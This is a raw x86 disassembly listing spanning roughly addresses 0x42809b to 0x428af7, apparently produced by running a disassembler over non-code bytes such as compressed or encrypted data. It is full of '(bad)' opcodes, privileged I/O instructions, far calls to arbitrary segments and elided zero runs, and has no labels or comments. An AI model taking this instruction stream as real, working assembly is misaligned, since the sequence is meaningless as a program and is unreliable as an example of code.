  42809b:	sbb    ah,BYTE PTR [edx-0x17]
  42809e:	jnp    0x428109
  4280a0:	pop    ebp
  4280a1:	mov    bh,0x8a
  4280a3:	push   0xfffffffc
  4280a5:	and    BYTE PTR [ecx],bl
  4280a7:	out    0xc3,eax
  4280a9:	pop    eax
  4280aa:	dec    eax
  4280ab:	adc    bl,BYTE PTR [edi+esi*1]
  4280ae:	push   ss
  4280af:	push   es
  4280b0:	arpl   bx,dx
  4280b2:	push   0x48261bf4
  4280b7:	enter  0x1380,0xfe
  4280bb:	scas   al,BYTE PTR es:[edi]
  4280bc:	mov    ds:0x48f431e2,eax
  4280c1:	and    al,0xc8
  4280c3:	mov    ds:0x8c5da771,al
  4280c8:	js     0x428129
  4280ca:	data16 (bad) 
  4280cc:	call   0x188b:0x882f5ff4
  4280d3:	push   ebx
  4280d4:	stc    
  4280d5:	inc    ebx
  4280d6:	aad    0xf0
  4280d8:	cmp    dl,al
  4280da:	or     al,0x38
  4280dc:	in     eax,0xb5
  4280de:	dec    eax
  4280df:	rol    DWORD PTR [ebp*8+0x68ef8a15],cl
  4280e6:	and    BYTE PTR [eax+0x23224ad0],bl
  4280ec:	push   ss
  4280ed:	or     eax,0xe85d1770
  4280f2:	stos   BYTE PTR es:[edi],al
  4280f3:	test   al,0x3b
  4280f5:	sbb    al,0xf3
  4280f7:	jns    0x42811a
  4280f9:	sub    DWORD PTR [eax+0x67e2e74],ebx
  4280ff:	call   edi
  428101:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428102:	adc    eax,0x54ded9f6
  428107:	mov    edx,0x759e64
  42810c:	sti    
  42810d:	push   0xffffffa7
  42810f:	dec    esp
  428110:	aam    0x0
	...
  428172:	add    BYTE PTR [eax],al
  428174:	fucomip st,st(6)
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	push   esi
  428181:	popa   
  428182:	imul   edi,DWORD PTR [esi],0x1ad0f
  428188:	add    eax,0xc3000001
  42818d:	pop    edx
  42818e:	adc    al,0xc3
  428190:	cmp    eax,0x2287ffd5
  428195:	(bad)  
  428196:	aas    
  428197:	rcl    edx,cl
  428199:	test   eax,ebx
  42819b:	aad    0x6d
  42819d:	popa   
  42819e:	xor    al,BYTE PTR [ebx+0x7a]
  4281a1:	mov    ds:0x2f830a59,eax
  4281a6:	into   
  4281a7:	and    cl,dh
  4281a9:	push   ecx
  4281aa:	dec    ebp
  4281ab:	sbb    ah,cl
  4281ad:	outs   dx,DWORD PTR ds:[esi]
  4281ae:	in     al,dx
  4281af:	cmp    esi,ecx
  4281b1:	sbb    eax,0xb8c66db3
  4281b6:	push   edx
  4281b7:	cmc    
  4281b8:	sub    dl,cl
  4281ba:	rcr    BYTE PTR [edi+0x80b414d],cl
  4281c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281c1:	mov    bl,0xe2
  4281c3:	and    dh,BYTE PTR [ebx]
  4281c5:	mov    bh,0xdd
  4281c7:	mov    al,0x43
  4281c9:	popf   
  4281ca:	jno    0x428222
  4281cc:	jmp    0x42814e
  4281ce:	addr16 fld st(4)
  4281d1:	call   0x4b84:0x5eceb6f
  4281d8:	or     edx,DWORD PTR [eax]
  4281da:	and    al,BYTE PTR [ebp-0x7cecb1d8]
  4281e0:	jae    0x4281e9
  4281e2:	or     DWORD PTR [ebp+0x7651f9b0],esp
  4281e8:	adc    DWORD PTR [ecx],edi
  4281ea:	ret    0xa39d
  4281ed:	stos   BYTE PTR es:[edi],al
  4281ee:	sahf   
  4281ef:	retf   0x97da
  4281f2:	jbe    0x42818e
  4281f4:	cmp    al,0xdf
  4281f6:	call   0xd052:0xa1038f92
  4281fd:	stos   DWORD PTR es:[edi],eax
  4281fe:	sbb    al,0x6a
  428200:	jmp    0xc352:0xcedcb1cc
  428207:	imul   ebx,DWORD PTR [edi],0xd0f9826d
  42820d:	fdiv   QWORD PTR [ecx+ecx*2+0x76]
  428211:	adc    dl,BYTE PTR [ebp-0x7]
  428214:	mov    eax,ds:0x9b42de6e
  428219:	scas   al,BYTE PTR es:[edi]
  42821a:	imul   edx,DWORD PTR [eax-0x45],0x37
  42821e:	jecxz  0x4281ab
  428220:	inc    edx
  428221:	xor    eax,0xf84bcb3b
  428226:	das    
  428227:	sub    eax,0x50427555
  42822c:	xor    cl,BYTE PTR [ebx-0x7c]
  42822f:	scas   eax,DWORD PTR es:[edi]
  428230:	jae    0x4281d3
  428232:	push   ebx
  428233:	and    DWORD PTR [edi+0x4b],0xd861169f
  42823a:	pop    esi
  42823b:	test   al,0xa2
  42823d:	lods   al,BYTE PTR ds:[esi]
  42823e:	mov    ah,0x91
  428240:	push   edx
  428241:	ds dec esp
  428243:	or     eax,0x6dd18333
  428248:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428249:	shl    BYTE PTR [ebp-0x2c],cl
  42824c:	pop    edx
  42824d:	pop    ebx
  42824e:	mov    bh,0x53
  428250:	cwde   
  428251:	xor    DWORD PTR [edi-0x7f327eea],esi
  428257:	push   eax
  428258:	retf   
  428259:	push   ebx
  42825a:	fisub  WORD PTR [ecx-0x51]
  42825d:	out    dx,eax
  42825e:	push   esi
  42825f:	cmp    al,0xc9
  428261:	pop    ss
  428262:	mov    dl,0xc7
  428264:	sti    
  428265:	push   ss
  428266:	fsubr  QWORD PTR [ebx]
  428268:	add    DWORD PTR [ebx-0x34],0x86fb7d1d
  42826f:	div    esi
  428271:	push   edi
  428272:	cdq    
  428273:	jae    0x428259
  428275:	sub    bl,dh
  428277:	sub    ecx,ecx
  428279:	mov    dl,0xda
  42827b:	sbb    edx,DWORD PTR [edx+0x20]
  42827e:	and    dl,BYTE PTR [edx-0x2cd2fb31]
  428284:	inc    esi
  428285:	test   ah,dl
  428287:	nop
  428288:	push   ss
  428289:	add    esi,DWORD PTR [eax]
  42828b:	dec    ebx
  42828c:	pop    ebp
  42828d:	xor    bl,BYTE PTR [edx-0x20]
  428290:	xchg   ebp,eax
	...
  4282f1:	add    BYTE PTR [eax],al
  4282f3:	add    bh,al
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	dec    edi
  428301:	cs push esi
  428303:	jmp    0x44311c
  428308:	add    eax,0x2b000001
  42830d:	cli    
  42830e:	mov    WORD PTR [ecx+0x28ee4afc],es
  428314:	lahf   
  428315:	scas   eax,DWORD PTR es:[edi]
  428316:	arpl   WORD PTR [esp+edx*8],di
  428319:	cmc    
  42831a:	in     al,dx
  42831b:	xchg   ebp,eax
  42831c:	jbe    0x42835f
  42831e:	mov    ecx,0x445923d2
  428323:	aaa    
  428324:	push   ebx
  428325:	fbld   TBYTE PTR [edi+eax*2]
  428328:	enter  0xc043,0x65
  42832c:	mov    ah,0x97
  42832e:	add    BYTE PTR [edx-0x18],bl
  428331:	xchg   ebp,eax
  428332:	xor    ecx,esp
  428334:	xor    ch,dl
  428336:	aaa    
  428337:	mov    ds:0x6c138e9f,al
  42833c:	fadd   st,st(4)
  42833e:	mov    eax,0xad85691d
  428343:	std    
  428344:	mov    al,0x9b
  428346:	jb     0x42834a
  428348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428349:	loop   0x42830d
  42834b:	gs pusha 
  42834d:	mov    bh,0xc4
  42834f:	loop   0x428344
  428351:	retf   0x8984
  428354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428356:	push   ss
  428357:	xchg   esi,edx
  428359:	jb     0x42836b
  42835b:	dec    edi
  42835c:	dec    eax
  42835d:	sti    
  42835e:	inc    esp
  42835f:	add    ch,BYTE PTR [edi]
  428361:	stc    
  428362:	xchg   esi,eax
  428363:	popf   
  428364:	(bad)  
  428365:	jmp    0x428385
  428367:	nop
  428368:	jno    0x42834d
  42836a:	hlt    
  42836b:	rol    BYTE PTR [edx],cl
  42836d:	and    BYTE PTR [ecx],al
  42836f:	or     bh,BYTE PTR [edi-0x4ba56e0a]
  428375:	aaa    
  428376:	imul   eax,DWORD PTR [edi+0x6f13185a],0x2b855da5
  428380:	iret   
  428381:	ret    
  428382:	mov    cl,0x33
  428384:	push   ebp
  428385:	xchg   edi,eax
  428386:	xchg   ecx,eax
  428387:	mov    eax,ds:0x8ae3e855
  42838c:	jb     0x4283a2
  42838e:	fdiv   QWORD PTR [ecx]
  428390:	push   edx
  428391:	add    DWORD PTR [ebp-0x6fe852c4],eax
  428397:	jno    0x4283d5
  428399:	addr16 pop es
  42839b:	sbb    BYTE PTR [eax+ecx*1+0x61b3a2f3],ch
  4283a2:	ss mov dl,0x7c
  4283a5:	and    DWORD PTR [ebp+0x76],ebp
  4283a8:	cli    
  4283a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283aa:	mov    ebp,0xabe71368
  4283af:	jl     0x4283e7
  4283b1:	test   BYTE PTR [eax-0x8fe6ef7],0xe9
  4283b8:	mov    ?,WORD PTR [ebx-0x433f5c3a]
  4283be:	jne    0x4283d1
  4283c0:	jmp    0x4283a3
  4283c2:	inc    esp
  4283c3:	push   0xffffff9b
  4283c5:	pop    esp
  4283c6:	add    BYTE PTR [ebx],dl
  4283c8:	data16 mov cl,al
  4283cb:	test   DWORD PTR [edi-0x5a],0x9485b697
  4283d2:	mov    cl,0xd0
  4283d4:	add    BYTE PTR cs:[eax+0x361fe470],al
  4283db:	xor    eax,0xc81ce611
  4283e0:	xor    dl,BYTE PTR [eax]
  4283e2:	and    eax,0x2b19fb19
  4283e7:	dec    edi
  4283e8:	lods   al,BYTE PTR ds:[esi]
  4283e9:	imul   ecx,DWORD PTR [ebx-0x2d0ceba2],0x9c573c3a
  4283f3:	imul   edi,DWORD PTR [ecx],0xffffffeb
  4283f6:	ret    
  4283f7:	stos   BYTE PTR es:[edi],al
  4283f8:	shl    bl,1
  4283fa:	ds mov dh,0xcd
  4283fd:	iret   
  4283fe:	sar    ch,0xa2
  428401:	cwde   
  428402:	mov    ebp,DWORD PTR [esi]
  428404:	add    edi,DWORD PTR [eax+ebp*1-0x5a4b9aee]
  42840b:	mov    ecx,0xf2748ec6
  428410:	xchg   esi,eax
	...
  428471:	add    BYTE PTR [eax],al
  428473:	add    BYTE PTR [esi],cl
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0xfbabfb32
  428481:	inc    edi
  428482:	jo     0x4284b5
  428484:	sbb    DWORD PTR [edi+0x1050001],ebp
  42848a:	add    BYTE PTR [eax],al
  42848c:	cdq    
  42848d:	stc    
  42848e:	jmp    0x4284d2
  428490:	push   ss
  428491:	jne    0x42848b
  428493:	repz lds edx,FWORD PTR [ebx]
  428496:	or     al,0xfb
  428498:	xchg   esi,eax
  428499:	jp     0x42847e
  42849b:	pop    ebp
  42849c:	add    esi,eax
  42849e:	shl    bh,1
  4284a0:	ja     0x4284c9
  4284a2:	and    eax,DWORD PTR [eax+ecx*8-0x7ac731c4]
  4284a9:	pop    esp
  4284aa:	or     bl,al
  4284ac:	ss mov edi,0xbdf89e6c
  4284b2:	hlt    
  4284b3:	out    0xb5,al
  4284b5:	mov    ebx,0x6aca1e50
  4284ba:	pop    edx
  4284bb:	pop    es
  4284bc:	dec    ebp
  4284bd:	xor    BYTE PTR [edx],bl
  4284bf:	sti    
  4284c0:	out    0xfd,al
  4284c2:	gs clc 
  4284c4:	mov    bl,0x2e
  4284c6:	add    BYTE PTR [eax],bl
  4284c8:	dec    esi
  4284c9:	push   cs
  4284ca:	dec    eax
  4284cb:	or     BYTE PTR [edx],ah
  4284cd:	leave  
  4284ce:	mov    gs,WORD PTR [ecx]
  4284d0:	jo     0x4284b4
  4284d2:	jno    0x428472
  4284d4:	pop    ebx
  4284d5:	push   esi
  4284d6:	lea    ebx,[edx]
  4284d8:	pop    esp
  4284d9:	mov    eax,0x796c9d2
  4284de:	pop    esi
  4284df:	mov    edi,ecx
  4284e1:	xor    DWORD PTR [edi],0x8c2098b8
  4284e7:	aas    
  4284e8:	xor    BYTE PTR [edx],dh
  4284ea:	daa    
  4284eb:	adc    dl,al
  4284ed:	and    al,al
  4284ef:	and    BYTE PTR [ecx+0x12dbbf0a],dh
  4284f5:	ror    BYTE PTR fs:[edx-0xad327d7],0x63
  4284fd:	xchg   DWORD PTR [esi+esi*2],ebx
  428500:	xor    BYTE PTR [ecx+0x79],bh
  428503:	addr16 jne 0x428575
  428506:	xor    ah,BYTE PTR [ecx-0x22]
  428509:	scas   al,BYTE PTR es:[edi]
  42850a:	push   esi
  42850b:	std    
  42850c:	xchg   edi,eax
  42850d:	xor    esi,DWORD PTR [edi-0x201654eb]
  428513:	pop    ebp
  428514:	imul   ecx,esi,0x63
  428517:	adc    DWORD PTR [edi-0x24],ebp
  42851a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42851b:	cmp    cl,0x4
  42851e:	hlt    
  42851f:	pushf  
  428520:	cmp    cl,dl
  428522:	repz aam 0xf1
  428525:	in     al,dx
  428526:	sbb    eax,0x7c620b28
  42852b:	push   ecx
  42852c:	outs   dx,BYTE PTR ds:[esi]
  42852d:	iret   
  42852e:	in     al,dx
  42852f:	adc    DWORD PTR [eax*2-0x26e35670],0x16e2b5da
  42853a:	sbb    eax,0x436a5f3a
  42853f:	dec    esi
  428540:	imul   esi,DWORD PTR [edi+0x1b],0x4bd4fa82
  428547:	mov    ebp,0xc5dbca53
  42854c:	inc    edx
  42854d:	in     al,0x15
  42854f:	mov    ebp,cs
  428551:	in     eax,dx
  428552:	xchg   esi,eax
  428553:	dec    edx
  428554:	xchg   edi,eax
  428555:	mov    al,ds:0x968b8349
  42855a:	mul    edi
  42855c:	call   0x3da88ce9
  428561:	mov    ebp,0x37643d4
  428566:	std    
  428567:	shl    eax,0x81
  42856a:	ss aad 0xe9
  42856d:	(bad)  [esi]
  42856f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428570:	(bad)  
  428571:	mov    eax,ds:0xc8f4b796
  428576:	inc    edi
  428577:	and    al,0xac
  428579:	xchg   ecx,eax
  42857a:	pop    ebp
  42857b:	imul   ebp,DWORD PTR [ecx-0x1f],0xffffffe3
  42857f:	mov    ah,0x38
  428581:	and    BYTE PTR [ecx+edx*1-0x3f],ch
  428585:	dec    ebp
  428586:	sbb    ebp,DWORD PTR [edi-0x1d]
  428589:	cld    
  42858a:	ret    0xa8a1
  42858d:	inc    edi
  42858e:	mov    DWORD PTR ds:0xd2,ecx
	...
  4285f4:	push   ecx
  4285f5:	div    BYTE PTR ds:0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x999ba3f6
  428602:	cs push 0x1e
  428605:	mov    al,0x1
  428607:	add    BYTE PTR ds:0x1b000001,al
  42860d:	mov    ds:0x3dfee8e5,eax
  428612:	cmp    ecx,DWORD PTR [ecx-0x7cc50985]
  428618:	jge    0x42859c
  42861a:	fcom   DWORD PTR [ecx-0x12]
  42861d:	and    DWORD PTR [edi],ecx
  42861f:	push   0x23
  428621:	idiv   DWORD PTR [esi-0x4740f43c]
  428627:	push   ecx
  428628:	pop    ebp
  428629:	pusha  
  42862a:	lock inc esi
  42862c:	mov    bh,dl
  42862e:	loopne 0x428635
  428630:	jg     0x428663
  428632:	fnsave [esi-0x55730a26]
  428638:	(bad)  
  428639:	iret   
  42863a:	lea    ebp,[edx]
  42863c:	pop    ds
  42863d:	xchg   BYTE PTR [edx-0x3e057aeb],bh
  428643:	push   edi
  428644:	xlat   BYTE PTR ds:[ebx]
  428645:	out    0xc5,al
  428647:	push   edi
  428648:	lods   al,BYTE PTR ds:[esi]
  428649:	dec    esp
  42864a:	mov    ch,0xba
  42864c:	pop    edx
  42864d:	cdq    
  42864e:	cmp    dl,bl
  428650:	xor    DWORD PTR [edi-0x2b],esi
  428653:	xchg   DWORD PTR fs:[esi+0x1be2b4c8],ebp
  42865a:	rol    DWORD PTR [ebx-0x5c9aa1b8],cl
  428660:	adc    DWORD PTR [esi+eiz*2+0x4d32f7e],ebp
  428667:	xchg   BYTE PTR [ecx+esi*2+0x53],al
  42866b:	xlat   BYTE PTR ds:[ebx]
  42866c:	fidiv  WORD PTR [edi+ebx*8-0x6c348ce7]
  428673:	adc    eax,edi
  428675:	or     al,0xaa
  428677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428678:	adc    al,0x54
  42867a:	inc    ebx
  42867b:	pop    ebp
  42867c:	pop    eax
  42867d:	xor    al,0xe4
  42867f:	inc    eax
  428680:	pop    ss
  428681:	jb     0x428631
  428683:	scas   al,BYTE PTR es:[edi]
  428684:	lods   al,BYTE PTR ds:[esi]
  428685:	xchg   edx,eax
  428686:	jbe    0x428691
  428688:	fdivr  st(0),st
  42868a:	or     dl,ah
  42868c:	mov    edi,0x37418645
  428691:	push   ecx
  428692:	push   0xffffffa0
  428694:	fiadd  WORD PTR [edx-0x43]
  428697:	jb     0x428668
  428699:	and    bh,al
  42869b:	xchg   edi,eax
  42869c:	into   
  42869d:	ror    DWORD PTR ds:0x493f4ad3,1
  4286a3:	inc    ebx
  4286a4:	fild   WORD PTR [edi+0x1a970c98]
  4286aa:	jae    0x4286e3
  4286ac:	call   0x16367d2c
  4286b1:	pop    ss
  4286b2:	xor    ah,cl
  4286b4:	mov    edx,0xe881d99
  4286b9:	mov    esi,0xcfb91a6a
  4286be:	or     BYTE PTR [ebp-0x17],0x15
  4286c2:	mov    al,ds:0xd80231fb
  4286c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4286c8:	dec    edi
  4286c9:	inc    ecx
  4286ca:	jge    0x42868b
  4286cc:	out    dx,eax
  4286cd:	jg     0x4286b0
  4286cf:	pop    edi
  4286d0:	push   esi
  4286d1:	in     eax,dx
  4286d2:	ds out dx,eax
  4286d4:	xor    DWORD PTR [eax-0x2c],esi
  4286d7:	out    dx,al
  4286d8:	retf   0x78e0
  4286db:	push   eax
  4286dc:	and    bl,al
  4286de:	mov    dl,0xf7
  4286e0:	shr    BYTE PTR [ecx+ebp*4-0x58],0x84
  4286e5:	mov    dl,0xee
  4286e7:	js     0x428689
  4286e9:	jnp    0x42874b
  4286eb:	outs   dx,DWORD PTR ds:[esi]
  4286ec:	loop   0x428705
  4286ee:	sti    
  4286ef:	lds    ebx,FWORD PTR [eax+0x67]
  4286f2:	cld    
  4286f3:	adc    eax,0xfda5ba5a
  4286f8:	add    DWORD PTR [ecx+0x7],ebx
  4286fb:	pop    edx
  4286fc:	push   es
  4286fd:	(bad)  
  428701:	dec    esi
  428702:	dec    esp
  428703:	jo     0x42875f
  428705:	(bad)  
  428706:	jb     0x428747
  428708:	pop    ds
  428709:	mov    es,WORD PTR [ebp+0xa]
  42870c:	lods   eax,DWORD PTR ds:[esi]
  42870d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42870e:	add    bh,al
  428710:	mov    ch,0x0
	...
  428772:	add    BYTE PTR [eax],al
  428774:	push   esi
  428775:	pop    ebx
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x14a0496
  428783:	and    DWORD PTR [ebx],0x50001b1
  428789:	add    DWORD PTR [eax],eax
  42878b:	add    BYTE PTR [edx+edx*8-0x5a],dh
  42878f:	jae    0x4287d1
  428791:	jg     0x4287c6
  428793:	xor    al,0x40
  428795:	jo     0x42874d
  428797:	cmp    BYTE PTR [ebp-0x2c0feed0],dh
  42879d:	push   ss
  42879e:	pop    ebp
  42879f:	out    dx,al
  4287a0:	fwait
  4287a1:	mov    bh,0xf3
  4287a3:	sub    DWORD PTR [edi],edx
  4287a5:	call   0xb0a06817
  4287aa:	adc    eax,0x7f8d8897
  4287af:	and    eax,0x5c813c74
  4287b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4287b5:	push   es
  4287b6:	dec    eax
  4287b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4287b8:	lahf   
  4287b9:	std    
  4287ba:	cmp    DWORD PTR [ecx],ecx
  4287bc:	mov    eax,ds:0x7910efcd
  4287c1:	rol    edi,cl
  4287c3:	repz dec esp
  4287c5:	repnz pop esi
  4287c7:	ficom  WORD PTR [ebx+0x3f]
  4287ca:	and    ebp,DWORD PTR [ecx+0x5aa02ce7]
  4287d0:	test   BYTE PTR [esi+edx*2-0x55],dh
  4287d4:	aas    
  4287d5:	xchg   ah,al
  4287d7:	je     0x428760
  4287d9:	and    DWORD PTR [ebx],ecx
  4287db:	and    BYTE PTR [esi+esi*1-0x66],bh
  4287df:	das    
  4287e0:	or     al,0x17
  4287e2:	jle    0x428812
  4287e4:	push   ebx
  4287e5:	push   0x152ee8aa
  4287ea:	bound  edx,QWORD PTR [edi]
  4287ec:	loope  0x4287bc
  4287ee:	jmp    0x26721bbe
  4287f3:	and    eax,0xbb06b6ef
  4287f8:	mov    ebp,0x5ea226e9
  4287fd:	cmc    
  4287fe:	outs   dx,DWORD PTR ds:[esi]
  4287ff:	push   es
  428800:	(bad)  
  428801:	cmp    eax,0xfbe838c3
  428806:	fild   QWORD PTR [ecx]
  428808:	or     dl,bh
  42880a:	push   0x3a9e6d85
  42880f:	ins    BYTE PTR es:[edi],dx
  428810:	aam    0xb6
  428812:	sub    al,0xea
  428814:	test   eax,0x4695835d
  428819:	or     al,0x3f
  42881b:	aad    0xc7
  42881d:	pcmpgtb mm0,QWORD PTR [ebx+0x25ce166e]
  428824:	repnz popa 
  428826:	or     esi,esp
  428828:	jae    0x428828
  42882a:	sub    BYTE PTR [edx-0x2c],0xa0
  42882e:	mov    ebx,gs
  428830:	ins    DWORD PTR es:[edi],dx
  428831:	mov    ecx,0xf6680ba
  428836:	imul   BYTE PTR [eax]
  428838:	adc    edx,edi
  42883a:	rcr    esi,0x53
  42883d:	adc    BYTE PTR [eax+0x54],bh
  428840:	fidiv  DWORD PTR [ebp-0x48]
  428843:	out    0xed,eax
  428845:	or     BYTE PTR [ebx-0x20],0x8
  428849:	in     eax,0x8e
  42884b:	pop    eax
  42884c:	mov    bl,0xd3
  42884e:	imul   ebx
  428850:	or     dh,dl
  428852:	and    dl,BYTE PTR [ebx]
  428854:	pop    eax
  428855:	mov    al,ds:0x679e69a
  42885a:	aas    
  42885b:	mov    eax,0xeed74a29
  428860:	and    eax,ebp
  428862:	or     eax,0x4f6b2f3c
  428867:	push   esp
  428868:	mov    ds:0x34b15cb,al
  42886d:	jl     0x42889b
  42886f:	cmp    al,0xc1
  428871:	in     al,dx
  428872:	ret    
  428873:	pop    esi
  428874:	push   esi
  428875:	sahf   
  428876:	push   esi
  428877:	pop    ebx
  428878:	addr16 pop esp
  42887a:	and    bh,BYTE PTR [eax-0x46]
  42887d:	lahf   
  42887e:	not    WORD PTR fs:[esi]
  428882:	dec    edi
  428883:	pusha  
  428884:	mov    bl,0xd
  428886:	sahf   
  428887:	imul   ecx,esi,0x7b
  42888a:	fsub   DWORD PTR [edi+0x31c244e4]
  428890:	cli    
	...
  4288f1:	add    BYTE PTR [eax],al
  4288f3:	add    BYTE PTR [esi],ah
  4288f5:	jp     0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi-0x4b5d62f1],bx
  428902:	or     DWORD PTR [esi+0x28],0x50001b2
  428909:	add    DWORD PTR [eax],eax
  42890b:	add    al,bl
  42890d:	mov    eax,ebx
  42890f:	test   eax,0x17c51212
  428914:	jbe    0x4288da
  428916:	mov    bl,0x3a
  428918:	mov    ebp,0x74c5ba62
  42891d:	rcr    BYTE PTR [esi],0x37
  428920:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428921:	cwde   
  428922:	lods   eax,DWORD PTR ds:[esi]
  428923:	div    DWORD PTR [edx+0x2c5c15f1]
  428929:	stos   DWORD PTR es:[edi],eax
  42892a:	shr    BYTE PTR [edi+0x304a1bfb],cl
  428930:	mov    eax,DWORD PTR [eax+edx*2-0x4922423a]
  428937:	mov    al,ds:0xd734fddd
  42893c:	stos   DWORD PTR es:[edi],eax
  42893d:	mov    BYTE PTR [eax+edx*4-0x4e35cfa2],dl
  428944:	pop    ecx
  428945:	push   ds
  428946:	xlat   BYTE PTR ds:[ebx]
  428947:	or     ah,0xe1
  42894a:	inc    ebp
  42894b:	mov    ds:0x6ee3335c,eax
  428950:	xchg   esp,eax
  428951:	pop    esp
  428952:	jecxz  0x42897c
  428954:	push   edi
  428956:	(bad)  
  428957:	icebp  
  428958:	mov    ebp,0xd0dd0f66
  42895d:	ja     0x428968
  42895f:	rcl    BYTE PTR gs:[esi+0x2afd79be],0x1f
  428967:	cmp    al,0xf2
  428969:	xor    eax,0x12270aec
  42896e:	es iret 
  428970:	push   0x65
  428972:	pop    eax
  428973:	xchg   ebp,eax
  428974:	xchg   BYTE PTR [ebx-0xf],bh
  428977:	stos   DWORD PTR es:[edi],eax
  428978:	add    al,0x84
  42897a:	cdq    
  42897b:	ss out 0x67,eax
  42897e:	jnp    0x428923
  428980:	mov    al,ds:0xc55062d0
  428985:	stos   DWORD PTR es:[edi],eax
  428986:	mov    ds:0x2b4a70fa,eax
  42898b:	outs   dx,DWORD PTR ds:[esi]
  42898c:	xor    BYTE PTR [ebx-0x3f08d5d7],0x9b
  428993:	aaa    
  428994:	loop   0x428986
  428996:	cmp    BYTE PTR [edi],cl
  428998:	(bad)  
  428999:	call   0x5c948c20
  42899e:	add    esp,DWORD PTR [edi+0x55]
  4289a1:	popa   
  4289a2:	xchg   esp,eax
  4289a3:	out    0xbc,al
  4289a5:	(bad)  
  4289a6:	fld    DWORD PTR [ebp-0x44]
  4289a9:	mov    DWORD PTR [edi],ebx
  4289ab:	xor    BYTE PTR [edx-0x77430b07],dl
  4289b1:	test   BYTE PTR [eax-0x1a],dh
  4289b4:	inc    edx
  4289b5:	xchg   edi,eax
  4289b6:	or     eax,0x2b0654cf
  4289bb:	mov    cl,0x7
  4289be:	(bad)  
  4289c0:	or     esi,esp
  4289c2:	retf   0x4129
  4289c5:	sti    
  4289c6:	jmp    0xc846:0x4f95e260
  4289cd:	sbb    edi,DWORD PTR [ebp-0x62]
  4289d0:	cdq    
  4289d1:	xor    dl,0xc6
  4289d4:	adc    eax,0x9903305b
  4289d9:	or     al,0xa8
  4289db:	xchg   ebp,eax
  4289dc:	(bad)  
  4289dd:	xor    bh,BYTE PTR [ecx+eiz*8-0x12]
  4289e1:	daa    
  4289e2:	push   0xffffff99
  4289e4:	push   ds
  4289e5:	sub    DWORD PTR [ebp+0x45d5c20c],edi
  4289eb:	fwait
  4289ec:	push   cs
  4289ed:	leave  
  4289ee:	cmp    esi,DWORD PTR [ebx]
  4289f0:	sahf   
  4289f1:	out    dx,eax
  4289f2:	in     al,0x6b
  4289f4:	into   
  4289f5:	jns    0x428a0a
  4289f7:	xchg   ebp,eax
  4289f8:	or     al,0xd4
  4289fa:	or     DWORD PTR [ecx],esp
  4289fc:	mov    DWORD PTR [edx+edx*8],edx
  4289ff:	int3   
  428a00:	add    BYTE PTR [eax],bh
  428a02:	test   eax,0xd4838240
  428a07:	xor    ebx,ecx
  428a09:	adc    dl,ah
  428a0b:	adc    ebp,DWORD PTR [ebx]
  428a0d:	cwde   
  428a0e:	sub    bh,cl
  428a10:	cmp    eax,0x0
	...
  428a71:	add    BYTE PTR [eax],al
  428a73:	add    BYTE PTR [ebp+0xc],cl
  428a76:	clc    
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax+0x5bc02013]
  428a83:	aam    0x2d
  428a85:	mov    bl,0x1
  428a87:	add    BYTE PTR ds:0xb5000001,al
  428a8d:	in     eax,dx
  428a8e:	jo     0x428a7b
  428a90:	xor    bl,BYTE PTR [ecx-0x519286d4]
  428a96:	sub    al,0xbd
  428a98:	pusha  
  428a99:	call   0xbe6cf05
  428a9e:	cmp    al,0x33
  428aa0:	in     eax,dx
  428aa1:	push   ebp
  428aa2:	ror    edi,1
  428aa4:	mov    ebx,0x9cef287e
  428aa9:	xchg   edi,eax
  428aaa:	push   ecx
  428aab:	dec    edx
  428aac:	dec    ecx
  428aad:	sbb    ebp,0xffffffaf
  428ab0:	pushf  
  428ab1:	mov    al,0xc6
  428ab3:	adc    DWORD PTR [edi+0x4b380aa7],ecx
  428ab9:	aaa    
  428aba:	mov    ah,0x93
  428abc:	or     al,0x5c
  428abe:	mov    dh,0x2d
  428ac0:	out    dx,al
  428ac1:	loop   0x428a60
  428ac3:	stos   DWORD PTR es:[edi],eax
  428ac4:	inc    edx
  428ac5:	call   0x1bb5:0xc464296c
  428acc:	pop    ebx
  428acd:	sub    edi,DWORD PTR [esi+0x797771b8]
  428ad3:	dec    esp
  428ad4:	and    al,BYTE PTR [esi]
  428ad6:	pusha  
  428ad7:	sub    BYTE PTR ds:0x31ea8fc7,ah
  428add:	shr    BYTE PTR [eax+0x46],0x94
  428ae1:	dec    edx
  428ae2:	dec    ebp
  428ae3:	sar    DWORD PTR [ebx],cl
  428ae5:	cmp    al,0x35
  428ae7:	cmp    al,BYTE PTR [eax-0xb]
  428aea:	mov    cl,0x89
  428aec:	jns    0x428b6b
  428aee:	lea    ebx,[ebx]
  428af0:	ds popa 
  428af2:	adc    eax,0x704e927c
  428af7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
